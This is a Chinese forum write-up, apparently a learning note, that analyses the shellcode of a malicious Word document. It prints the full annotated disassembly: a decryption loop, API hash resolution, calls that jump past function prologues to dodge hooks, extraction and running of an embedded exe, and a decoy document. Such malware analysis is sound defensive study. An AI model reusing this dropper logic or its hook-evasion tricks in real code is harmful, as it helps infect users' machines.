
# 一个 word 溢出样本的 shellcode 分析

> 原文：[`www.pediy.com/kssd/pediy12/130249.html`](https://www.pediy.com/kssd/pediy12/130249.html)

【文章标题】：一个 word 溢出样本的 shellcode 分析  
【文章作者】：守卫者  
【下载地址】：请自行搜索  
【作者声明】：本文是小菜的学习笔记，请轻拍  

前几天从网上下载一个 doc 文档，打开时 360 竟然立即提示“远线程注入危险行为”。  
我很是奇怪，怎么打开一个 doc 文档也引起报警。仔细查找原因，原来这个 doc 文档竟然会使 word 发生溢出。发生溢出后释放了一个 exe 格式的病毒文件，幸好这个病毒运行时被 360 拦截了，不然我就中招了 ![](img/8665dab461df9ff5e20e52adf9adf6de.jpg "伤心")  
我一时兴起，就把这个 doc 文档的 shellcode 跟踪了一遍。  
因为以前也做过几次，所以轻车熟路  
下面是 shellcode 的汇编分析，不知道怎么弄语法高亮，大家凑合吧 ![](img/d23858dd221cce728a3a61b46badb044.jpg "恐怖!")  

代码:



# shellcode 分析
\------------------

```
00121CF8     41                       inc     ecx
00121CF9     41                       inc     ecx
00121CFA     41                       inc     ecx
00121CFB     41                       inc     ecx
00121CFC     41                       inc     ecx
00121CFD     41                       inc     ecx
00121CFE     41                       inc     ecx
00121CFF     41                       inc     ecx
00121D00     E8 01000000              call    00121D06

00121D06     8B0C24                   mov     ecx, dword ptr \[esp\]
00121D09     83C4 04                  add     esp, 4
00121D0C     8D49 12                  lea     ecx, dword ptr \[ecx+12\]
00121D0F     41                       inc     ecx<----------------------+
00121D10     8031 67                  xor     byte ptr \[ecx\], 67  | ; 通过循环解密出下面的代码，下面所有代码都是由这个循环解密出来的
00121D13     8039 90                  cmp     byte ptr \[ecx\], 90  |
00121D16   ^ 75 F7                    jnz     short 00121D0F------------+  
00121D18     6A 07                    push    7    ; 正常 doc 文件名大小
00121D1A     68 9D8B0000              push    8B9D  ; 正常 doc 文件名偏移
00121D1F     68 000A0000              push    0A00  ; exe 文件大小
00121D24     68 9D810000              push    819D  ; exe 文件偏移
00121D29     68 004E0000              push    4E00  ; 正常 doc 文件大小
00121D2E     68 A48B0000              push    8BA4  ; 正常 doc 文件偏移
00121D33     6A 00                    push    0    ; 
00121D35     68 A4D90000              push    0D9A4  ; 样本文件的大小
00121D3A     54                       push    esp
00121D3B     FC                       cld
00121D3C     68 9332E494              push    94E43293----------+
00121D41     68 C48D1F74              push    741F8DC4    |
00121D46     68 B2360F13              push    130F36B2    |
00121D4B     68 57660DFF              push    FF0D6657    |
00121D50     68 512FA201              push    1A22F51    |
00121D55     68 39E27D83              push    837DE239    | ; 这些是 API 函数名的 Hash 值
00121D5A     68 8FF21861              push    6118F28F    | ; shellcode 使用 API 函数时，需要自己确定 API 函数
00121D5F     68 43BEACDB              push    DBACBE43    | ; 的地址。
00121D64     68 EDAFFFB4              push    B4FFAFED    | ; 这里保存的函数名 Hash 值，有助于以后查找这些
00121D69     68 A92299A1              push    A19922A9    | ; 函数的内存地址。
00121D6E     68 8E130AAC              push    AC0A138E    |
00121D73     68 9B878BE5              push    E58B879B----------+
00121D78     8BF4                     mov     esi, esp
00121D7A     8D7E D0                  lea     edi, dword ptr \[esi-30\]
00121D7D     33DB                     xor     ebx, ebx
00121D7F     B7 04                    mov     bh, 4
00121D81     2BE3                     sub     esp, ebx
00121D83     54                       push    esp
00121D84     33D2                     xor     edx, edx--------------------------+
00121D86     64:8B5A 30               mov     ebx, dword ptr fs:\[edx+30\]  |
00121D8A     8B4B 0C                  mov     ecx, dword ptr \[ebx+C\]    |
00121D8D     8B49 1C                  mov     ecx, dword ptr \[ecx+1C\]    | ; 取得 kernel32 的基地址，保存到 ebp
00121D90     8B09                     mov     ecx, dword ptr \[ecx\]    |
00121D92     8B69 08                  mov     ebp, dword ptr \[ecx+8\]------------+
00121D95     AD                       lods    dword ptr \[esi\]-------------------+
00121D96     3D 9332E494              cmp     eax, 94E43293      |
00121D9B     75 00                    jnz     short 00121D9D      |
00121D9D     60                       pushad          |
00121D9E     8B45 3C                  mov     eax, dword ptr \[ebp+3C\]    |
00121DA1     8B4C05 78                mov     ecx, dword ptr \[ebp+eax+78\]  |
00121DA5     03CD                     add     ecx, ebp        |
00121DA7     8B59 20                  mov     ebx, dword ptr \[ecx+20\]    | ; 获取 API 函数的地址
00121DAA     03DD                     add     ebx, ebp        | ; 通过枚举 kernel32 模块的导出表，来查找
00121DAC     33FF                     xor     edi, edi        | ; shellcode 需要使用的 API 函数的地址。
00121DAE     47                       inc     edi        | ; 在枚举 kernel32 的导出表时，通过和以上
00121DAF     8B34BB                   mov     esi, dword ptr \[ebx+edi\*4\]  | ; Hash 值比较，找出目标 API。
00121DB2     03F5                     add     esi, ebp        | ; 
00121DB4     99                       cdq          | ; 
00121DB5     0FBE06                   movsx   eax, byte ptr \[esi\]    | ; 
00121DB8     3AC4                     cmp     al, ah        |
00121DBA     74 08                    je      short 00121DC4      |
00121DBC     C1CA 07                  ror     edx, 7        |
00121DBF     03D0                     add     edx, eax        |
00121DC1     46                       inc     esi        |
00121DC2   ^ EB F1                    jmp     short 00121DB5      |
00121DC4     3B5424 1C                cmp     edx, dword ptr \[esp+1C\]    |
00121DC8   ^ 75 E4                    jnz     short 00121DAE      |
00121DCA     8B59 24                  mov     ebx, dword ptr \[ecx+24\]    |
00121DCD     03DD                     add     ebx, ebp        |
00121DCF     66:8B3C7B                mov     di, word ptr \[ebx+edi\*2\]    |
00121DD3     8B59 1C                  mov     ebx, dword ptr \[ecx+1C\]    |
00121DD6     03DD                     add     ebx, ebp        |
00121DD8     032CBB                   add     ebp, dword ptr \[ebx+edi\*4\]  |
00121DDB     95                       xchg    eax, ebp        |
00121DDC     5F                       pop     edi        |
00121DDD     AB                       stos    dword ptr es:\[edi\]    |
00121DDE     57                       push    edi        |
00121DDF     61                       popad          |
00121DE0     3D 9332E494              cmp     eax, 94E43293      |
00121DE5   ^ 75 AE                    jnz     short 00121D95--------------------+
00121DE7     81EC 00080000            sub     esp, 800
00121DED     8BEC                     mov     ebp, esp
00121DEF     8B47 FC                  mov     eax, dword ptr \[edi-4\]
00121DF2     83C0 05                  add     eax, 5
00121DF5     8947 FC                  mov     dword ptr \[edi-4\], eax
00121DF8     8B47 EC                  mov     eax, dword ptr \[edi-14\]
00121DFB     83C0 05                  add     eax, 5
00121DFE     8947 EC                  mov     dword ptr \[edi-14\], eax
00121E01     33DB                     xor     ebx, ebx------------------+
00121E03     6A 00                    push    0        |
00121E05     53                       push    ebx      |
00121E06     FF57 D4                  call    dword ptr \[edi-2C\]  | ; 通过循环调用 GetFileSize，找到样本文件在溢出进程中的句柄
00121E09     3B47 34                  cmp     eax, dword ptr \[edi+34\]  |
00121E0C     74 05                    je      short 00121E13    |
00121E0E     83C3 04                  add     ebx, 4      |
00121E11   ^ EB F0                    jmp     short 00121E03------------+
00121E13     895F 38                  mov     dword ptr \[edi+38\], ebx    ; 把样本文件的句柄到\[edi+38\]
00121E16     83C5 08                  add     ebp, 8
00121E19     55                       push    ebp      ;
00121E1A     68 00010000              push    100      ;
00121E1F     FF57 E8                  call    dword ptr \[edi-18\]  ; Call GetTempPathA，取得临时目录的路径
00121E22     8DB5 00010000            lea     esi, dword ptr \[ebp+100\]
00121E28     56                       push    esi       ;
00121E29     6A 00                    push    0         ;
00121E2B     6A 00                    push    0         ;
00121E2D     55                       push    ebp       ;
00121E2E     FF57 D8                  call    dword ptr \[edi-28\]   ; Call GetTempFileNameA，获取一个临时文件的名称
00121E31     6A 00                    push    0---------------------------------+
00121E33     6A 00                    push    0          |
00121E35     6A 02                    push    2          |
00121E37     6A 00                    push    0          |
00121E39     6A 00                    push    0          |
00121E3B     68 00000040              push    40000000        | ; 调用 CreateFile 在临时目录创建新文件（shellcode 会释放一个 exe）
00121E40     56                       push    esi        | ; 这里没有按照常规的方式调用 API
00121E41     E8 00000000              call    00121E46        | ; 首先是 shellcode 自己执行了 CreateFile 函数的头两句指令
00121E46     58                       pop     eax        | ; 然后自己把返回地址压入堆栈
00121E47     83C0 0D                  add     eax, 0D        | ; 最后使用 jmp 指令条到 CreateFile 函数的第 3 条指令去执行
00121E4A     50                       push    eax        | ; 
00121E4B     55                       push    ebp        | ; 这样做的好处是避开了一些在函数头的 hook
00121E4C     8BEC                     mov     ebp, esp        |
00121E4E     8B47 FC                  mov     eax, dword ptr \[edi-4\]    |
00121E51     FFE0                     jmp     eax-------------------------------+
00121E53     83F8 00                  cmp     eax, 0
00121E56     0F8E E1010000            jle     0012203D
00121E5C     8985 00060000            mov     dword ptr \[ebp+600\], eax    ; 新文件的句柄保存在\[ebp+600\]
00121E62     8B5F 44                  mov     ebx, dword ptr \[edi+44\]    ; 取得要释放的 exe 文件在样本文件中的偏移
00121E65     8B77 38                  mov     esi, dword ptr \[edi+38\]    ; 从\[edi+38\]取得样本文件的句柄
00121E68     6A 00                    push    0        ;
00121E6A     6A 00                    push    0        ;
00121E6C     53                       push    ebx      ;
00121E6D     56                       push    esi      ;
00121E6E     FF57 E0                  call    dword ptr \[edi-20\]  ; Call SetFilePointer，把样本文件的指针定位到要释放的 exe 文件那里
00121E71     8B5F 48                  mov     ebx, dword ptr \[edi+48\]    ; 取得要释放的 exe 的文件大小
00121E74     C785 04060000 00040000   mov     dword ptr \[ebp+604\], 400
00121E7E     6A 00                    push    0<------------------------------------------------------------------------+
00121E80     8D85 00070000            lea     eax, dword ptr \[ebp+700\]  ;            |
00121E86     50                       push    eax      ;            |
00121E87     68 00040000              push    400      ;            |
00121E8C     8D85 00020000            lea     eax, dword ptr \[ebp+200\]  ;            |
00121E92     50                       push    eax      ;            |
00121E93     8B77 38                  mov     esi, dword ptr \[edi+38\]  ;            |
00121E96     56                       push    esi      ;            |
00121E97     FF57 F4                  call    dword ptr \[edi-C\]    ; Call ReadFile，从样本文件中读取 exe 的数据  |
00121E9A     8BC3                     mov     eax, ebx                  |
00121E9C     2D 00040000              sub     eax, 400                  |
00121EA1     83F8 00                  cmp     eax, 0                  |
00121EA4     7F 06                    jg      short 00121EAC                |
00121EA6     899D 04060000            mov     dword ptr \[ebp+604\], ebx              |
00121EAC     33C9                     xor     ecx, ecx                  |
00121EAE     8DB40D 00020000          lea     esi, dword ptr \[ebp+ecx+200\]<-----+          | ; 循环释放样本文件中捆绑的 exe
00121EB5     AC                       lods    byte ptr \[esi\]      |          |
00121EB6     32C1                     xor     al, cl        |          |
00121EB8     87FA                     xchg    edx, edi        |          |
00121EBA     8DBC0D 00020000          lea     edi, dword ptr \[ebp+ecx+200\]  |          |
00121EC1     AA                       stos    byte ptr es:\[edi\]      | ; 对读取出的数据进行解密    |
00121EC2     87FA                     xchg    edx, edi        |          |
00121EC4     41                       inc     ecx        |          |
00121EC5     3B8D 04060000            cmp     ecx, dword ptr \[ebp+604\]    |          |
00121ECB   ^ 75 E1                    jnz     short 00121EAE--------------------+          |
00121ECD     6A 00                    push    0        ;            |
00121ECF     8D85 04070000            lea     eax, dword ptr \[ebp+704\]  ;            |
00121ED5     50                       push    eax      ;            |
00121ED6     FFB5 04060000            push    dword ptr \[ebp+604\]  ;            |
00121EDC     8D85 00020000            lea     eax, dword ptr \[ebp+200\]  ;            |
00121EE2     50                       push    eax      ;            |
00121EE3     FFB5 00060000            push    dword ptr \[ebp+600\]  ;            |
00121EE9     FF57 F8                  call    dword ptr \[edi-8\]    ; Call WriteFile，把解密出的数据写入新文件  |
00121EEC     81EB 00040000            sub     ebx, 400                  |
00121EF2     83FB 00                  cmp     ebx, 0                  |
00121EF5   ^ 7F 87                    jg      short 00121E7E------------------------------------------------------------+
00121EF7     FFB5 00060000            push    dword ptr \[ebp+600\]
00121EFD     FF57 F0                  call    dword ptr \[edi-10\]  ; Call CloseHandle
00121F00     6A 00                    push    0---------------------------------+
00121F02     8DB5 00010000            lea     esi, dword ptr \[ebp+100\]    |
00121F08     56                       push    esi        |
00121F09     E8 00000000              call    00121F0E        | ; 调用 WinExec 来运行释放出的 exe
00121F0E     58                       pop     eax        | ; 调用时使用了非常规的调用方式
00121F0F     83C0 0D                  add     eax, 0D        | ; 与上面调用 CreateFile 函数一样
00121F12     50                       push    eax        | ; 直接从函数的第 3 条指令开始执行
00121F13     55                       push    ebp        | ; 
00121F14     8BEC                     mov     ebp, esp        | ; 
00121F16     8B47 EC                  mov     eax, dword ptr \[edi-14\]    |
00121F19     FFE0                     jmp     eax-------------------------------+
00121F1B     6A 00                    push    0        ;
00121F1D     6A 00                    push    0        ;  
00121F1F     FF77 4C                  push    dword ptr \[edi+4C\]  ; 把文件指针移动到样本文件中存放正常 doc 文件文件名的地方
00121F22     FF77 38                  push    dword ptr \[edi+38\]    ;
00121F25     FF57 E0                  call    dword ptr \[edi-20\]    ;
00121F28     6A 00                    push    0          ;  
00121F2A     8D85 00070000            lea     eax, dword ptr \[ebp+700\]    ;
00121F30     50                       push    eax        ;
00121F31     FF77 50                  push    dword ptr \[edi+50\]    ; 读取正常 doc 文件的文件名
00121F34     8D85 00010000            lea     eax, dword ptr \[ebp+100\]    ;
00121F3A     50                       push    eax        ;
00121F3B     FF77 38                  push    dword ptr \[edi+38\]    ;
00121F3E     FF57 F4                  call    dword ptr \[edi-C\]      ;
00121F41     33C0                     xor     eax, eax  --------------------------------+
00121F43     40                       inc     eax          |
00121F44     807C05 00 00             cmp     byte ptr \[ebp+eax\], 0      |
00121F49   ^ 75 F8                    jnz     short 00121F43        |
00121F4B     8B4F 50                  mov     ecx, dword ptr \[edi+50\]      | ; 把临时目录的路径和正常 doc 的文件名组合到一起
00121F4E     87FB                     xchg    ebx, edi          |
00121F50     8D7C05 00                lea     edi, dword ptr \[ebp+eax\]      |
00121F54     8DB5 00010000            lea     esi, dword ptr \[ebp+100\]      |
00121F5A     F3:A4                    rep     movs byte ptr es:\[edi\], byte ptr \[esi\]  |
00121F5C     87FB                     xchg    ebx, edi----------------------------------+
00121F5E     6A 00                    push    0---------------------------------+
00121F60     6A 00                    push    0          |
00121F62     6A 02                    push    2          |
00121F64     6A 00                    push    0          |
00121F66     6A 00                    push    0          |
00121F68     68 00000040              push    40000000        |
00121F6D     55                       push    ebp        | ; 调用 CreateFile 在临时目录创建正常的 doc 文件
00121F6E     E8 00000000              call    00121F73        | ; 非常规调用方式
00121F73     58                       pop     eax        |
00121F74     83C0 0D                  add     eax, 0D        |
00121F77     50                       push    eax        |
00121F78     55                       push    ebp        |
00121F79     8BEC                     mov     ebp, esp        |
00121F7B     8B47 FC                  mov     eax, dword ptr \[edi-4\]    |
00121F7E     FFE0                     jmp     eax-------------------------------+
00121F80     83F8 00                  cmp     eax, 0
00121F83     0F8E B1000000            jle     0012203A
00121F89     8985 00060000            mov     dword ptr \[ebp+600\], eax  ; 保存正常 doc 文件的句柄到\[ebp+600\]
00121F8F     8B5F 3C                  mov     ebx, dword ptr \[edi+3C\]    ;
00121F92     8B77 38                  mov     esi, dword ptr \[edi+38\]    ;
00121F95     6A 00                    push    0          ;
00121F97     6A 00                    push    0          ;
00121F99     53                       push    ebx        ; 这些代码似乎没有意义
00121F9A     56                       push    esi        ;
00121F9B     FF57 E0                  call    dword ptr \[edi-20\]    ;
00121F9E     8B5F 40                  mov     ebx, dword ptr \[edi+40\]  ; 获取正常 doc 的文件大小
00121FA1     C785 04060000 00040000   mov     dword ptr \[ebp+604\], 400
00121FAB     8B47 34                  mov     eax, dword ptr \[edi+34\]<--------------------------------------------------+
00121FAE     2BC3                     sub     eax, ebx                  |
00121FB0     6A 00                    push    0                    |
00121FB2     6A 00                    push    0                    |
00121FB4     50                       push    eax                  |
00121FB5     56                       push    esi                  |
00121FB6     FF57 E0                  call    dword ptr \[edi-20\]  ; Call SetFilePointer，移动样本文件的文件指针  |
00121FB9     6A 00                    push    0                    |
00121FBB     8D85 00070000            lea     eax, dword ptr \[ebp+700\]              |
00121FC1     50                       push    eax                  |
00121FC2     68 00040000              push    400                  |
00121FC7     8D85 00020000            lea     eax, dword ptr \[ebp+200\]              |
00121FCD     50                       push    eax                  |
00121FCE     56                       push    esi                  |
00121FCF     FF57 F4                  call    dword ptr \[edi-C\]    ; Call ReadFile，从样本文件中读取正常 doc 的数据  |
00121FD2     8BC3                     mov     eax, ebx                  |
00121FD4     2D 00040000              sub     eax, 400                  |
00121FD9     83F8 00                  cmp     eax, 0                  | ; 循环释放正常的 doc
00121FDC     7F 06                    jg      short 00121FE4                | ; 正常的 doc 就附加在样本文件的尾部
00121FDE     899D 04060000            mov     dword ptr \[ebp+604\], ebx              | ; 呈未加密状态
00121FE4     8B47 40                  mov     eax, dword ptr \[edi+40\]              |
00121FE7     2BC3                     sub     eax, ebx                  |
00121FE9     6A 00                    push    0                    |
00121FEB     8D85 04070000            lea     eax, dword ptr \[ebp+704\]              |
00121FF1     50                       push    eax                  |
00121FF2     FFB5 04060000            push    dword ptr \[ebp+604\]              |
00121FF8     8D85 00020000            lea     eax, dword ptr \[ebp+200\]              |
00121FFE     50                       push    eax                  |
00121FFF     FFB5 00060000            push    dword ptr \[ebp+600\]              |
00122005     FF57 F8                  call    dword ptr \[edi-8\]    ; Call WriteFile，把数据写入新文件    |
00122008     41                       inc     ecx                  |
00122009     41                       inc     ecx                  |
0012200A     49                       dec     ecx                  |
0012200B     49                       dec     ecx                  |
0012200C     81EB 00040000            sub     ebx, 400                  |
00122012     83FB 00                  cmp     ebx, 0                  |
00122015   ^ 7F 94                    jg      short 00121FAB------------------------------------------------------------+
00122017     FFB5 00060000            push    dword ptr \[ebp+600\]
0012201D     FF57 F0                  call    dword ptr \[edi-10\]  ; CloseHandle
00122020     6A 00                    push    0
00122022     FF57 D0                  call    dword ptr \[edi-30\]  ; GetCommandLine，这个调用好象是多余的
00122025     83ED 07                  sub     ebp, 7        ;
00122028     C745 FF 00636D64         mov     dword ptr \[ebp-1\], 646D6300  ; 构造出字符串"cmd.exe \\c c:\\temp\\正常 doc 文件.doc"
0012202F     C745 03 202F6320         mov     dword ptr \[ebp+3\], 20632F20  ;
00122036     6A 00                    push    0-------------------------+
00122038     55                       push    ebp      |
00122039     E8 00000000              call    0012203E      |
0012203E     58                       pop     eax      | ; 非常规方式调用 WinExec
0012203F     83C0 0D                  add     eax, 0D      | ; WinExec("cmd.exe \\c c:\\temp\\正常 doc 文件.doc", 0)
00122042     50                       push    eax      | ; 使用以上命令调用 WinExec 函数
00122043     55                       push    ebp      | ; 打开正常的 doc 文件
00122044     8BEC                     mov     ebp, esp      | ;
00122046     8B47 EC                  mov     eax, dword ptr \[edi-14\]  |
00122049     FFE0                     jmp     eax-----------------------+
0012204B     6A 00                    push    0
0012204D     6A FF                    push    -1
0012204F     FF57 E4                  call    dword ptr \[edi-1C\]  ; TerminateProcess(-1, 0)，退出发生溢出的 word 进程
00122052     90                       nop
00122053     F7F7                     div     edi
00122055     F7F7                     div     edi
00122057     F7F7                     div     edi
```
